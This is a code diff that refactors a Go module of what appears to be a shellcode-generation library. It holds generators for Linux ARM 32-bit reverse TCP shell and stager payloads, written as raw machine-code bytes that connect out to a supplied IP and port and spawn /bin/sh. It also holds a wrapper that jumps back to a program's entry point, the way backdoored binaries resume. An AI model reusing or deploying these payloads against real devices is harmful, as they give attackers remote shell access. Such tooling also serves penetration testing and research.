@@ -1,15 +1,17 @@
-package shellcode
+package modules
+
+import "github.com/awgh/shellcode/api"
 
 func init() {
-	RegisterShellCode(Linux, Arm, Bits32,
+	api.RegisterShellCode(api.Linux, api.Arm, api.Bits32,
 		"reverse_tcp_shell", reverse_tcp_shell_Generate)
-	RegisterShellCode(Linux, Arm, Bits32,
+	api.RegisterShellCode(api.Linux, api.Arm, api.Bits32,
 		"reverse_tcp_stager", reverse_tcp_stager_Generate)
-	RegisterShellCode(Linux, Arm, Bits32,
+	api.RegisterShellCode(api.Linux, api.Arm, api.Bits32,
 		"user_shellcode", user_shellcode_Generate)
 }
 
-func reverse_tcp_shell_Generate(params Parameters) ([]byte, error) {
+func reverse_tcp_shell_Generate(params api.Parameters) ([]byte, error) {
 	port := params.Port
 	entry := params.Entry
 	shellcode_vaddr := uint32(0x0)
@@ -27,7 +29,7 @@ func reverse_tcp_shell_Generate(params Parameters) ([]byte, error) {
 
 	// JMP Address = (entrypoint - currentaddress -8)/4
 	jmpAddr := uint32(0xffffff) + (entry - (shellcode_vaddr+uint32(len(shellcode1))-4)/4)
-	if as, err := PackAddr(jmpAddr); err == nil {
+	if as, err := api.PackAddr(jmpAddr); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
@@ -49,12 +51,12 @@ func reverse_tcp_shell_Generate(params Parameters) ([]byte, error) {
 		"\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef" + //exit
 		"\x02\x00"
 
-	if ps, err := PackPort(port); err == nil {
+	if ps, err := api.PackPort(port); err == nil {
 		shellcode1 += ps
 	} else {
 		return nil, err
 	}
-	shellcode1 += PackIP(ip)
+	shellcode1 += api.PackIP(ip)
 
 	shellcode1 += "\x2f\x62\x69\x6e" +
 		"\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2d\x43\x00" +
@@ -65,7 +67,7 @@ func reverse_tcp_shell_Generate(params Parameters) ([]byte, error) {
 
 }
 
-func reverse_tcp_stager_Generate(params Parameters) ([]byte, error) {
+func reverse_tcp_stager_Generate(params api.Parameters) ([]byte, error) {
 	port := params.Port
 	entry := params.Entry
 	shellcode_vaddr := uint32(0x0)
@@ -89,7 +91,7 @@ func reverse_tcp_stager_Generate(params Parameters) ([]byte, error) {
 	shellcode1 += "\x00\x00\x00\x0a" // beq to shellcode
 	// JMP Address = (entrypoint - currentaddress -8)/4
 	jmpAddr := uint32(0xffffff) + (entry - (shellcode_vaddr+uint32(len(shellcode1))-4)/4)
-	if as, err := PackAddr(jmpAddr); err == nil {
+	if as, err := api.PackAddr(jmpAddr); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
@@ -110,18 +112,18 @@ func reverse_tcp_stager_Generate(params Parameters) ([]byte, error) {
 		"\x52\xe3\x02\x00\x00\xda\xfa\x2f\xa0\xe3\x00\x00\x00\xef\xf7" +
 		"\xff\xff\xea\xfa\x2f\x82\xe2\x00\x00\x00\xef\x01\xf0\xa0\xe1" +
 		"\x02\x00"
-	if ps, err := PackPort(port); err == nil {
+	if ps, err := api.PackPort(port); err == nil {
 		shellcode1 += ps
 	} else {
 		return nil, err
 	}
-	shellcode1 += PackIP(ip)
+	shellcode1 += api.PackIP(ip)
 	shellcode1 += "\x19\x01\x00\x00\x00\xf0\xff\xff\x22\x10\x00\x00"
 
 	return []byte(shellcode1), nil
 }
 
-func user_shellcode_Generate(params Parameters) ([]byte, error) {
+func user_shellcode_Generate(params api.Parameters) ([]byte, error) {
 	entry := params.Entry
 	shellcode_vaddr := uint32(0x0)
 	supplied_shellcode := params.ShellCode
@@ -138,7 +140,7 @@ func user_shellcode_Generate(params Parameters) ([]byte, error) {
 	shellcode1 += "\x00\x00\x00\x0a" // beq to shellcode
 	// JMP Address = (entrypoint - currentaddress -8)/4
 	jmpAddr := uint32(0xffffff) + (entry - (shellcode_vaddr+uint32(len(shellcode1))-4)/4)
-	if as, err := PackAddr(jmpAddr); err == nil {
+	if as, err := api.PackAddr(jmpAddr); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
